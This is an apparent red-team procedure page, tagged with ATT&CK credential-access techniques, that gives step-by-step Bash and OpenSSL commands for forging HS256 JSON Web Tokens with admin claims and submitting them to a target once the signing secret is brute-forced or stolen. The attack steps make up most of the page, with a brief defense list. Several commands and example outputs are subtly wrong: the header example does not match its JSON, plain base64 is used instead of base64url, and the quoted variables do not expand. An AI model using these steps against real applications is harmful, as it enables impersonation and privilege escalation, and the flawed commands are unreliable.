---
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Brute Force|T1110 - Brute Force]]'
  - >-
    [[techniques/Cloud Instance Metadata API|T1522 - Cloud Instance Metadata
    API]]
sub_techniques:
  - '[[sub-techniques/Password Cracking|T1110.002 - Password Cracking]]'
tags:
  - jwt
  - json-web-token
  - token-forgery
commands:
  - '[[commands/jwt-encode-header-hs256]]'
  - '[[commands/jwt-encode-payload]]'
  - '[[commands/jwt-sign-hmac-sha256]]'
  - '[[commands/jwt-assemble-token]]'
  - '[[commands/jwt-decode-header]]'
  - '[[commands/jwt-decode-payload]]'
  - '[[commands/jwt-verify-signature]]'
platforms:
  - Linux
tools: []
validated: true
---

# Create-and-Verify-JWT-Tokens-for-Forgery

## Summary

This procedure demonstrates how to manually create and verify JSON Web Tokens (JWTs) using HMAC-SHA256 signing in a Linux environment. It covers the step-by-step process of encoding the header and payload, generating a signature with a secret key, assembling the token, and verifying its integrity. This is useful for red teamers to understand JWT structure for forging tokens when the signing secret is obtained via brute force, credential stuffing, or other credential access techniques.

## Description

JWTs are compact tokens used for secure information exchange, consisting of a header, payload, and signature separated by dots, all base64-encoded. The header specifies the token type and signing algorithm (e.g., HS256 for HMAC-SHA256), the payload holds claims like user ID or expiration, and the signature ensures authenticity using a shared secret. Attackers can forge valid JWTs if they brute-force or steal the secret key, allowing unauthorized access to protected resources such as APIs or sessions. This procedure assumes a symmetric HMAC signing and targets web applications using JWT for authentication. Prerequisites include knowledge of the target application's secret (or a candidate for brute-forcing) and basic Bash scripting. Successful execution produces a verifiable token that can impersonate a user.

## Requirements

1. Linux environment with Bash and OpenSSL installed (standard on most distributions).
2. Knowledge or candidate for the signing secret key (e.g., obtained via brute force).
3. Target application details, such as expected claims in the payload (e.g., user ID, admin flag).
4. Network access to submit the forged token to the target API or service.

## Defense

- Store signing secrets securely using hardware security modules (HSMs) or environment variables, avoiding hardcoding.
- Implement rate limiting and account lockouts to mitigate brute-force attacks on secrets.
- Use asymmetric signing (RS256) with public/private keys where the public key is verifiable via JWKS endpoint.
- Enable JWT validation libraries with expiration checks, audience validation, and algorithm enforcement to prevent none-algorithm attacks.
- Monitor for anomalous token usage, such as unexpected admin claims or rapid token issuance.

## Objectives

1. Generate a valid JWT token with custom claims to impersonate a user or elevate privileges.
2. Verify the token's signature to ensure it passes application checks.
3. Understand the forging process to identify weak JWT implementations in target environments.

## Instructions

### Step 1: Encode the JWT Header

**Context**: The header defines the token type and algorithm. For HMAC-SHA256, use HS256. This step produces the base64-encoded header, which is the first part of the JWT.

**Command** ([[commands/jwt-encode-header-hs256]]):
```bash
echo -n '{"typ":"JWT","alg":"HS256"}' | base64 -w 0
```

> This command outputs the base64-encoded header (e.g., eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9). Save it to a variable like HEADER_B64 for later use. If the target uses a different algorithm, adjust the JSON accordingly.

### Step 2: Encode the JWT Payload

**Context**: The payload contains claims like subject (user ID), name, expiration (exp), and custom fields (e.g., admin). Set expiration to a future Unix timestamp to avoid immediate rejection. This step base64-encodes the payload JSON.

**Command** ([[commands/jwt-encode-payload]]):
```bash
echo -n '{"sub":"$_USER_ID","name":"$_USER_NAME","exp":"$_EXP_TIME","admin":$_IS_ADMIN}' | base64 -w 0
```

> Substitute parameters: e.g., $_USER_ID=1234567890, $_USER_NAME=Admin User, $_EXP_TIME=1735689600 (future timestamp), $_IS_ADMIN=true. Output example: eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJleHAiOiIxNzM1Njg5NjAwIiwiYWRtaW4iOnRydWV9. Save as PAYLOAD_B64. This allows forging elevated privileges by setting admin to true.

### Step 3: Generate the Signature

**Context**: Sign the concatenated header.payload using the secret key with HMAC-SHA256. This verifies the token's integrity. If the secret is brute-forced (e.g., via dictionary attack on common secrets like 'secret'), the signature will be valid.

**Command** ([[commands/jwt-sign-hmac-sha256]]):
```bash
echo -n "$_HEADER_B64.$_PAYLOAD_B64" | openssl dgst -sha256 -hmac "$_SECRET" -binary | base64 -w 0
```

> Use the previously encoded HEADER_B64 and PAYLOAD_B64. Example secret: $_SECRET=your_secret_key. Output: a base64 signature like TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ. Save as SIGNATURE_B64. Brute-forcing involves testing candidate secrets until the recomputed signature matches a captured valid token.

### Step 4: Assemble the JWT Token

**Context**: Combine the three parts to form the complete token. This is the final forged JWT ready for submission to the target.

**Command** ([[commands/jwt-assemble-token]]):
```bash
echo -n "$_HEADER_B64.$_PAYLOAD_B64.$_SIGNATURE_B64"
```

> Output: a full token like eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJleHAiOiIxNzM1Njg5NjAwIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ. Test by submitting to the target's authentication endpoint.

### Step 5: Decode and Verify the Token

**Context**: To confirm validity, decode the parts and re-sign to check the signature. This step verifies if the token would pass server checks.

**Command** ([[commands/jwt-decode-header]]):
```bash
echo "$_TOKEN" | cut -d '.' -f 1 | base64 -d 2>/dev/null
```

> Decodes the header. Then use [[commands/jwt-decode-payload]] for payload: echo "$_TOKEN" | cut -d '.' -f 2 | base64 -d 2>/dev/null. Expected: JSON with claims. Finally, use [[commands/jwt-verify-signature]] to recompute: echo -n "$(echo $_TOKEN | cut -d '.' -f 1-2)" | openssl dgst -sha256 -hmac "$_SECRET" -binary | base64 -w 0 and compare to the third part. If matching, the token is verified.

> If signatures match, the token is authentic; otherwise, the secret is incorrect (continue brute-forcing).
